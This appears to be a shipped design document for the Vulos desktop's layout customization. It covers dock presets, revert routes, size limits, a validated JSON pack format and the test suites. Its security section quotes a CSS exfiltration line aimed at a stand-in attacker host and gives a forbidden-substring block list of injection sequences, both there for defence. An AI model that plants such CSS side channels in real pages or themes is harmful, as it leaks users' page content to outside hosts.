# Customizing the Vulos desktop

Status: **shipped** (frontend/src/desktop/**). Pack format v1.

Vulos lets you move the dock, pick a layout that matches the desktop you came
from, and — if you are a developer — ship your own layout as a small JSON file.
It deliberately does **not** let you write CSS.

This document is the whole contract: the model, the security boundary and why it
is drawn where it is, the way back to stock, and the pack format a third party
needs.

---

## 1. What you can change

| Thing | Values | Where |
|---|---|---|
| Dock edge | `bottom` · `top` · `left` · `right` | Settings → Appearance → Desktop layout |
| Dock style | `floating` (rounded island, inset) · `bar` (full-span, flush) | same |
| Dock size | `small` (36px) · `medium` (44px) · `large` (56px) | same |
| Dock alignment | `start` · `center` · `end` | same |
| Autohide | on / off | same |
| Launcher / drawer / assistant buttons | on / off each | same |
| Default dock apps | ordered list of app ids | preset or pack; your pins override |
| Window controls | `left` · `right` | same |
| Appearance tokens | four allowlisted custom properties (§5) | pack only |

Two profiles, not one. `dock.desktop` and `dock.mobile` are separate and persist
separately: rearranging your desktop dock never touches your phone's, and vice
versa. A phone dock is not a narrow desktop dock — it holds fewer and often
different apps, and it has limits a desktop dock does not (§4).

Everything else about the shell — the menu bar's contents and position, the trust
badge, the public-app banner, the shared-desktop notice — is **not**
customizable. §5 explains why that is a security property and not an oversight.

---

## 2. Presets: ergonomics, not imitation

Four presets ship, defined once as data in `src/desktop/presets.ts`.

| Preset | Matches | What it does |
|---|---|---|
| **Vulos** | the default | Floating dock centred at the bottom, menu bar across the top, window controls left. |
| **Taskbar** | Windows habits | Full-width bar flush with the bottom edge, apps starting from the left, small tiles, window controls **right**. |
| **Menu bar and dock** | macOS habits | Large icons in a centred floating dock, window controls **left**, everything else in the top bar. |
| **Side dock** | Ubuntu habits | Vertical launcher pinned down the left edge, app-drawer button, window controls **right**. |

**What transfers between desktops is convention, not appearance.** Someone
arriving from Windows knows that close is top-right, that the launcher is
bottom-left, that the strip spans the screen. Someone arriving from macOS knows
the opposite for the first and a floating island for the third. Those are
ergonomics — motor habits about *where things are* — and honouring them is
straightforwardly good for the person.

What does **not** transfer, and is deliberately absent, is anyone's trade dress.
No cloned chrome, no copied icons, no lifted branding, no "looks exactly like
macOS" skin. Every preset draws Vulos' own tokens, its own icon set and its own
type; a screenshot of any preset is unmistakably Vulos. That is also why the
presets are named for what they **do** — "Taskbar", "Menu bar and dock", "Side
dock" — with the platform habit stated as a plain note rather than used as the
name.

The Vulos preset is always present, is what a fresh box boots into, and is what
every revert path returns to.

### First boot

The setup wizard's `appearance` step offers the preset list. The API is three
calls (`src/desktop/index.ts`):

```tsx
import { LAYOUT_PRESETS, describePreset, applyPreset } from '../desktop'

LAYOUT_PRESETS.map(p => (
  <PresetCard
    key={p.id}
    name={p.name}            // "Taskbar"
    familiar={p.familiar}    // "Matches Windows habits"
    summary={p.summary}      // one preview-safe sentence
    onPick={() => applyPreset(p.id)}
  />
))
```

`describePreset(p)` returns `summary + familiar` as one string if you want a
single line. Every one of those fields is an authored constant: no user input,
no pack HTML, nothing that needs escaping, short enough to render in a card at
390px. Choosing a preset is not a commitment — it is reversible from Settings
forever after.

---

## 3. Reverting

The requirement is that it is **easy to swap back**, and the failure mode to
design against is not "the user changed their mind" — it is "the layout they
picked made the control that undoes it hard to find, or hard to read".

Three routes, and **none of them depends on anything a layout or a pack can
change**:

1. **Settings → Appearance → Desktop layout → "Reset to stock layout".**
2. **`Ctrl` + `Alt` + `Shift` + `Backspace`**, from anywhere in the shell. The
   listener is bound at module scope in `src/desktop/store.ts`, not from a
   component, precisely because a component-mounted listener is the thing a bad
   layout could make unreachable. The chord is four keys deep and includes
   Backspace so it cannot be hit while typing.
3. **`?desktop-layout=stock`** in the URL, for a box with no keyboard.

`resetToStock()` *removes* the persisted keys rather than overwriting them, so
there is nothing left to come back after a reload. It reads no current state and
cannot fail validation, because the stock layout is a built-in.

### Why the revert control cannot be made unreadable

- Nothing in the model can set a colour, size or position on Settings, on the
  menu bar, or on any shell chrome. The only styling a pack can express is four
  namespaced tokens (§5), and the revert control reads none of them.
- Every value is enumerated or range-bounded, so there is no layout at all in
  which the dock is invisible, a tile is untappable, or the menu bar is covered.
  The e2e suite asserts the dock's box is on screen, is at least a 24px target,
  and does not overlap the menu bar — at 1280, 834, 768 and 390.
- A pack-supplied accent (`--vd-accent`) never reaches text directly. It is fed
  through `core/accentContrast.ts`, which moves it until it clears WCAG AA
  against the surfaces it actually lands on. A pack can choose a hue; it cannot
  choose to be unreadable.

---

## 4. Limits, and the arithmetic behind them

These are not taste. Each is the number that keeps a layout usable.

| Limit | Value | Why |
|---|---|---|
| Phone dock edge | `bottom` or `top` only | A left-vertical strip costs ~17% of a 390px screen on the axis a phone has least of, and puts every target outside the thumb arc. Beautiful at 1440px, broken at 390px. |
| Phone dock items | ≤ 5 | 390px minus gutters, over 5 items plus the mandatory drawer = ~62px slots. WCAG 2.5.8 wants 24px, platform guidance says 44px. A sixth drops to ~53px with no room left for a notched device's inset in landscape. |
| Phone dock size | `medium` or `large` | `small` is a 36px plate. Fine for a pointer, under the 44px touch target for a thumb. |
| Phone dock drawer | required | A phone strip cannot hold the library and there is no menu bar behind it, so dropping the drawer strands every app that is not pinned. |
| Desktop dock items | ≤ 12 | At 768px — the narrowest viewport that renders the desktop shell at all — twelve 44px tiles plus the launcher and assistant come to ~700px. Beyond that the dock relies on its overflow scroll to be usable on first paint, and a dock you must scroll before you can see your apps is not a dock. |

The dock **measures** its own overflow rather than guessing from an item count
(tile size, the launcher, the drawer, running-not-pinned apps and the viewport
all move it). It draws with `overflow: visible` so hover labels are not clipped,
and switches to a scroll container only when the content genuinely does not fit —
which is what keeps a full dock at 768px from putting a horizontal scrollbar
across the whole OS.

Sizes a preset picks are the only control over tile size. There is deliberately
no `--vd-dock-icon` token: the plate size is consumed by CSS *and* by the icon
component's numeric `size` prop, and a token would have been a second source of
truth that the two had to keep agreeing on.

---

## 5. The security boundary

### Why not custom CSS

Arbitrary CSS is not a safe extension mechanism for this product, and Vulos does
not ship one.

**Exfiltration.** `background: url(https://attacker.example/?leak=…)` is the
classic CSS side channel: a stylesheet that can name a remote URL can phone home,
and with attribute selectors it can phone home *conditionally on page content*.

**Trust-chrome spoofing, which is worse here.** This OS draws security state in
chrome:

- `shell/TrustBadge.tsx` — AI tier, egress destination, at-rest key lock.
- `shell/PublicAppBanner.tsx` — "anyone on the internet can view this app".
- `shell/SharedDesktopNotice.tsx` — "someone else is on this desktop".
- `shell/TransparencyPanel.tsx` — the full posture behind the badge.

A theme that could set `display:none`, `opacity:0`, `position:fixed` or a
background image on those elements could hide a live warning or paint a fake
reassurance. A user who trusts the badge would be trusting the pack author. That
is a security defect wearing a stylesheet, and no amount of sanitising a CSS
string fixes it — the capability itself is the problem.

So the model has **no CSS at all**: not a declaration, not a property name, not a
selector, not a stylesheet URL. A pack cannot name an element, so it cannot reach
one. That is stronger than a denylist of the surfaces we remembered to protect.

### What a pack *can* set

Four custom properties, each with a declared type **and** a range:

| Token | Type | Range | Notes |
|---|---|---|---|
| `--vd-dock-radius` | px length | 0 – 28 | Corner radius of the dock strip. |
| `--vd-dock-opacity` | number | 0.6 – 1 | Dock surface opacity. |
| `--vd-window-radius` | px length | 0 – 24 | Corner radius of a window frame. |
| `--vd-accent` | `#rgb` / `#rrggbb` | — | Fed through the AA derivation before anything is drawn in it. |

They are namespaced `--vd-` so they cannot collide with, or shadow, the design
tokens in `index.css` that the trust chrome is drawn from. **No trust surface
reads a `--vd-*` token.**

The **ranges are the security control**, not a nicety. `--vd-dock-opacity: 0` is
a perfectly well-typed number that produces a dock which occupies its edge while
being invisible — a UI you cannot navigate back out of. The floor is 0.6.

### How it is enforced

`src/desktop/validate.ts`, and the store calls it on **every read**, not just on
write. Hand-editing `localStorage` in devtools gets you a fallback to stock, not
a bypass. Concretely:

- **Unknown keys are errors**, not ignored fields. A validator that drops what it
  does not recognise is an invitation to smuggle — `{"css": "…", "edge":
  "bottom"}` would validate, and the next person to add a passthrough would ship
  the injection.
- **Grammar is anchored and tiny**: `^(0|\d{1,3}(\.\d{1,2})?)px$`,
  `^(0|1|0\.\d{1,3})$`, `^#([0-9a-f]{3}|[0-9a-f]{6})$`. Values are ≤ 32
  printable-ASCII characters.
- **Forbidden substrings are checked on top of the grammar**: `url(`, `image-set`,
  `@import`, `element(`, `expression`, `javascript:`, `data:`, `\`, `;`, `{`,
  `}`, `/*`, `<`, `>`, `var(`, `attr(`. The grammar already makes all of these
  unreachable; the list is there because the grammar is the part most likely to
  be loosened later ("we just need one more unit").
- **App ids are slugs** (`^[a-z0-9][a-z0-9-]{0,63}$`), so a pack cannot put a URL
  or a path traversal where an app id goes.
- **An installed pack that no longer validates is dropped, not repaired.**
  Silently "fixing" attacker-controlled data turns a validator into a parser for
  a format nobody documented.

Applying a layout only ever calls `style.setProperty(name, value)` for
allowlisted names, and removes any allowlisted property not in the new set. There
is no code path that writes `cssText` or injects a `<style>` element.

---

## 6. The pack format

A pack is one JSON file. Schema: `frontend/src/desktop/schema.json`
(`https://vulos.org/schema/desktop-pack-v1.json`).

```json
{
  "format": "vulos.desktop.pack",
  "version": 1,
  "id": "side-dock",
  "name": "Side dock",
  "familiar": "Matches Ubuntu habits",
  "summary": "A vertical launcher pinned down the left edge, window controls on the right.",
  "layout": {
    "dock": {
      "desktop": {
        "edge": "left", "size": "medium", "style": "bar", "align": "start",
        "autohide": false, "launcher": true, "assistant": true, "drawer": true,
        "items": ["home", "lilmail", "files", "drive", "vulos-calendar", "terminal", "persona"]
      },
      "mobile": {
        "edge": "bottom", "size": "large", "style": "bar", "align": "center",
        "autohide": false, "launcher": false, "assistant": true, "drawer": true,
        "items": ["home", "lilmail", "messages", "vulos-calendar"]
      }
    },
    "windowControls": "right",
    "tokens": { "--vd-dock-radius": "0px", "--vd-window-radius": "8px" }
  }
}
```

Every field is required except `layout.tokens`. `id` must not collide with a
built-in preset.

### Validate it

```
$ node src/desktop/cli/validate-pack.mjs my-layout.pack.json
OK   my-layout.pack.json  ->  "Side dock" (side-dock)
       desktop: bar dock on the left edge, 7 default items
       mobile:  bar dock on the bottom edge, 4 default items, drawer on
       window controls: right
       tokens: --vd-dock-radius, --vd-window-radius
```

Exit 0 on success, 1 on any failure, 2 on usage error. Failures print the JSON
path and the reason:

```
FAIL evil.pack.json
       evil.pack.json: unknown key "css"
       evil.pack.json.layout.dock.mobile.edge: expected one of bottom | top, got "left"
       evil.pack.json.layout.dock.mobile.size: expected one of medium | large, got "small"
       evil.pack.json.layout.dock.mobile.items: 6 items exceeds the mobile maximum of 5
       evil.pack.json.layout.dock.mobile.drawer: a mobile dock must keep the app-drawer
         affordance — it is the only route to the full library at phone width
       evil.pack.json.layout.tokens["--vd-accent"]: value contains forbidden sequence "url("
       evil.pack.json.layout.tokens["--vd-dock-opacity"]: 0 is below the minimum of 0.6 —
         Dock surface opacity. Floors at 0.6 so the dock can never be made invisible.
       evil.pack.json.layout.tokens: "--bg-elevated" is not an allowlisted custom property
         (allowed: --vd-dock-radius, --vd-dock-opacity, --vd-window-radius, --vd-accent)
```

Every error is reported, not just the first, and each carries the JSON path it
came from — including the path *into* `tokens`, so a manifest with several
objects tells you which one was wrong.

The CLI imports the **same** `validatePack()` the shell installs through. It is
not a second copy: a validator that disagrees with the thing it gates is worse
than no validator, because it tells you your pack is fine and the box then
refuses it.

### Install / uninstall

```ts
import { installPack, uninstallPack, installedPackList, applyPreset } from './desktop'

const result = installPack(JSON.parse(fileContents))
if (!result.ok) showErrors(result.errors)   // the same strings the CLI prints
else applyPreset(pack.id)

uninstallPack('side-dock')   // falls back to stock if it was the active layout
```

Installed packs persist under `vulos.desktop.packs` and are re-validated on every
load.

### The format is proven by using it

`side-dock` — a shipping, first-boot-selectable preset — is **not** written in
TypeScript. It is `src/desktop/packs/side-dock.pack.json`, parsed at module load
by the public `validatePack()`. If the pack format ever stops being able to
express a real preset, `presets.ts` fails to import and the suite goes red. That
is the only honest proof the format is usable, as opposed to documented.

---

## 7. What is verified, and how

`frontend/src/desktop/desktopLayout.test.ts` — 44 unit tests. Hostile packs
(remote `url()`, a non-allowlisted property, a raw `css` key, an extra key inside
a dock profile, opacity 0, an out-of-range radius, a `;`-smuggled second
declaration, `var()` indirection, `data:`, a vertical phone dock, a phone dock
without a drawer, six phone items, thirteen desktop items, a URL as an app id,
the wrong format discriminator). Plus the store's boundary behaviour, both revert
routes, and form-factor independence.

`frontend/e2e/desktop-layout.e2e.ts` — 15 Playwright tests in real Chromium.
Every preset and every dock edge is applied through the **real Settings UI**, at
1280×800, 834×1194, 768×1024 and 390×844, asserting on measured bounding boxes:
the dock is on screen, is a ≥24px target, does not overlap the menu bar, does not
overlap the ambient widget column, and nothing widens the document. Plus
autohide (hidden → hover → keyboard focus), both revert routes, a hostile layout
in storage applying nothing while the trust badge stays visible and unobscured,
and composited-pixel contrast for all four presets on **both** themes.

Both suites are mutation-tested; the commits record which mutation killed which
test.

---

## 8. Consuming the model from other shell code

```ts
import { getDockProfile, subscribeLayout, activeFormFactor } from './desktop'

const profile = getDockProfile()          // the active form factor's
const phone   = getDockProfile('mobile')  // explicitly the phone's
const stop    = subscribeLayout(() => { /* re-read */ })
```

React:

```tsx
import { useDockProfile, useDesktopLayout } from './desktop'
const profile = useDockProfile()   // active form factor
const layout  = useDesktopLayout() // the whole validated layout
```

The store is a module-level external store, not a context — nothing has to be
mounted for it to work.

The applied layout is also on `<html>` as attributes, so CSS can select on it and
a test can read it back:

`data-desktop-preset`, `data-dock-edge`, `data-dock-size`, `data-dock-style`,
`data-dock-align`, `data-dock-autohide`, `data-window-controls`.

`shell-chrome.css` publishes `--dock-reserve-left/right/top` (plate + padding +
floating margin) so any surface that must not sit under the dock can inset by the
right amount without re-deriving the geometry. They resolve to `0px` unless a
dock is actually on that edge.

---

## 9. Deliberately not in scope

- **Arbitrary CSS, user stylesheets, `<style>` injection.** §5.
- **Moving or hiding the menu bar.** It carries the trust badge, the exposure
  chip and the clock. A layout that can relocate it is a layout that can hide a
  live warning.
- **Icon themes / replacing app icons.** An icon pack that can redraw an app's
  identity can make one app look like another, which is a phishing primitive in a
  shell that launches third-party apps.
- **Fonts from a pack.** A font is a remote fetch and an exfiltration channel;
  `font-family` is also enough to make text unreadable at a range no validator
  can bound.
- **Layout scripting / hooks.** The whole point of an enumerated model is that
  the set of reachable states is finite and every one of them has been rendered
  and measured.
